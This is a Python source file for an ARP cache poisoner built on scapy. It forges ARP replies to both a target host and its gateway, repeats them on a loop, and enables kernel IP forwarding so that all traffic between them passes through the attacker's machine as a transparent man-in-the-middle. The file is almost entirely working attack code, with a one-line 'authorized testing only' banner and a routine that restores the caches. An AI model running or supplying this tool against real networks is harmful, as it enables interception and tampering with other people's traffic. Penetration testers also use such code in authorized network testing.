"""
ARP Cache Poisoner
==================
Implements bidirectional ARP poisoning for man-in-the-middle positioning
at Layer 2. Poisons both the target and gateway so all traffic flows through
the attacker's machine.

⚠️  FOR AUTHORIZED TESTING ONLY.

How ARP poisoning works:
  1. Send forged ARP reply to TARGET: "I am the gateway (IP=gateway, MAC=attacker)"
  2. Send forged ARP reply to GATEWAY: "I am the target (IP=target, MAC=attacker)"
  3. Both devices update their ARP caches with incorrect MAC mappings
  4. All traffic between them flows through attacker's machine
  5. Enable IP forwarding so victims stay connected (transparent MITM)

The caches expire (typically 60-300s), so poisoning must be repeated continuously.
"""

import os
import sys
import time
import signal
import threading
import subprocess
from typing import Optional

try:
    from scapy.all import (
        ARP, Ether, sendp, srp, get_if_hwaddr, conf
    )
except ImportError:
    print("[!] Scapy not installed. Run: pip install scapy")
    sys.exit(1)

from data.oui_lookup import get_vendor


class ARPPoisonerError(Exception):
    pass


def get_mac(ip: str, interface: str, timeout: int = 3) -> Optional[str]:
    """
    Resolve the MAC address for an IP via ARP request.

    Args:
        ip: Target IP address.
        interface: Network interface to send on.
        timeout: Seconds to wait for response.

    Returns:
        MAC address string, or None if unreachable.
    """
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pkt = ether / arp
    ans, _ = srp(pkt, iface=interface, timeout=timeout, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None


def enable_ip_forwarding():
    """Enable kernel IP forwarding so poisoned traffic still reaches its destination."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        return True
    except PermissionError:
        return False


def disable_ip_forwarding():
    """Restore IP forwarding to disabled state (default)."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
    except Exception:
        pass


class ARPPoisoner:
    """
    Bidirectional ARP cache poisoner.

    Positions the attacker as MITM between target and gateway by continuously
    sending forged ARP replies to both parties.

    Example:
        poisoner = ARPPoisoner("eth0", "192.168.1.10", "192.168.1.1")
        poisoner.start()   # blocks; Ctrl+C to stop and restore
    """

    DEFAULT_INTERVAL = 2.0    # seconds between re-poison packets
    RESTORE_COUNT = 5         # how many restore packets to send on cleanup

    def __init__(
        self,
        interface: str,
        target_ip: str,
        gateway_ip: str,
        interval: float = DEFAULT_INTERVAL,
        verbose: bool = True,
    ):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interval = interval
        self.verbose = verbose

        self.attacker_mac = get_if_hwaddr(interface)
        self.target_mac: Optional[str] = None
        self.gateway_mac: Optional[str] = None

        self._stop_event = threading.Event()
        self._packets_sent = 0
        self._running = False

    # ------------------------------------------------------------------ #
    # Packet crafting                                                      #
    # ------------------------------------------------------------------ #

    def _arp_poison_packet(self, dst_ip: str, dst_mac: str, src_ip: str) -> object:
        """
        Craft a forged ARP reply associating src_ip with attacker's MAC.

        This tells dst_mac that src_ip is at the attacker's MAC address,
        poisoning the ARP cache entry for src_ip.
        """
        return (
            Ether(dst=dst_mac) /
            ARP(
                op=2,               # ARP reply (op=1 is request)
                pdst=dst_ip,        # Who receives this update
                hwdst=dst_mac,      # Their MAC
                psrc=src_ip,        # The IP we're impersonating
                hwsrc=self.attacker_mac,   # Our MAC (lies about who owns src_ip)
            )
        )

    def _arp_restore_packet(
        self, dst_ip: str, dst_mac: str, src_ip: str, src_mac: str
    ) -> object:
        """
        Craft a legitimate ARP reply to restore correct IP→MAC mapping.
        Used during cleanup to un-poison victims' caches.
        """
        return (
            Ether(dst=dst_mac) /
            ARP(
                op=2,
                pdst=dst_ip,
                hwdst=dst_mac,
                psrc=src_ip,
                hwsrc=src_mac,
            )
        )

    # ------------------------------------------------------------------ #
    # Resolution                                                           #
    # ------------------------------------------------------------------ #

    def _resolve_macs(self):
        """ARP-resolve the target and gateway MAC addresses."""
        print(f"[*] Resolving MAC for target   {self.target_ip} ...")
        self.target_mac = get_mac(self.target_ip, self.interface)
        if self.target_mac is None:
            raise ARPPoisonerError(
                f"Cannot resolve MAC for target {self.target_ip}. "
                "Is the device online and on the same subnet?"
            )

        print(f"[*] Resolving MAC for gateway  {self.gateway_ip} ...")
        self.gateway_mac = get_mac(self.gateway_ip, self.interface)
        if self.gateway_mac is None:
            raise ARPPoisonerError(
                f"Cannot resolve MAC for gateway {self.gateway_ip}."
            )

    # ------------------------------------------------------------------ #
    # Core loop                                                            #
    # ------------------------------------------------------------------ #

    def _poison_loop(self):
        """Continuously send poison packets until stop event is set."""
        pkt_to_target = self._arp_poison_packet(
            self.target_ip, self.target_mac, self.gateway_ip
        )
        pkt_to_gateway = self._arp_poison_packet(
            self.gateway_ip, self.gateway_mac, self.target_ip
        )

        while not self._stop_event.is_set():
            sendp(pkt_to_target, iface=self.interface, verbose=False)
            sendp(pkt_to_gateway, iface=self.interface, verbose=False)
            self._packets_sent += 2

            if self.verbose:
                print(
                    f"\r[ARP POISON] Packets sent: {self._packets_sent}  "
                    f"Target cache poisoned: {self.target_ip}→{self.attacker_mac}  "
                    f"Gateway cache poisoned: {self.gateway_ip}→{self.attacker_mac}",
                    end="", flush=True
                )

            self._stop_event.wait(timeout=self.interval)

    def _restore(self):
        """
        Send legitimate ARP replies to restore victims' ARP caches.
        Called automatically on stop.
        """
        if not (self.target_mac and self.gateway_mac):
            return

        print("\n[*] Restoring ARP caches...")
        restore_to_target = self._arp_restore_packet(
            self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac
        )
        restore_to_gateway = self._arp_restore_packet(
            self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac
        )

        for _ in range(self.RESTORE_COUNT):
            sendp(restore_to_target, iface=self.interface, verbose=False)
            sendp(restore_to_gateway, iface=self.interface, verbose=False)
            time.sleep(0.2)

        print("[+] ARP caches restored.")

    # ------------------------------------------------------------------ #
    # Public API                                                           #
    # ------------------------------------------------------------------ #

    def start(self, duration: int = 0):
        """
        Start ARP poisoning.

        Args:
            duration: Run for this many seconds, then stop. 0 = run until Ctrl+C.
        """
        self._resolve_macs()

        print()
        print("=" * 60)
        print("  ARP POISONING SESSION")
        print("=" * 60)
        print(f"  Interface  : {self.interface}")
        print(f"  Attacker   : {self.attacker_mac}")
        print(f"  Target     : {self.target_ip} / {self.target_mac} ({get_vendor(self.target_mac)})")
        print(f"  Gateway    : {self.gateway_ip} / {self.gateway_mac} ({get_vendor(self.gateway_mac)})")
        print(f"  IP Forward : {'Enabled' if enable_ip_forwarding() else 'FAILED (traffic may drop)'}")
        print(f"  Interval   : {self.interval}s")
        print("=" * 60)
        print("[*] Poisoning ARP caches. Press Ctrl+C to stop and restore.")
        print()

        self._running = True
        self._stop_event.clear()

        # Handle Ctrl+C gracefully
        original_sigint = signal.getsignal(signal.SIGINT)
        def _handle_sigint(sig, frame):
            self.stop()
        signal.signal(signal.SIGINT, _handle_sigint)

        if duration > 0:
            # Run in background thread, stop after duration
            t = threading.Thread(target=self._poison_loop, daemon=True)
            t.start()
            t.join(timeout=duration)
            self.stop()
        else:
            # Blocking call
            try:
                self._poison_loop()
            except Exception:
                pass
            finally:
                self._restore()
                self._running = False
                signal.signal(signal.SIGINT, original_sigint)

    def stop(self):
        """Signal the poison loop to stop."""
        if self._running:
            self._stop_event.set()

    def get_stats(self) -> dict:
        return {
            "running": self._running,
            "packets_sent": self._packets_sent,
            "target_ip": self.target_ip,
            "target_mac": self.target_mac,
            "gateway_ip": self.gateway_ip,
            "gateway_mac": self.gateway_mac,
            "attacker_mac": self.attacker_mac,
        }
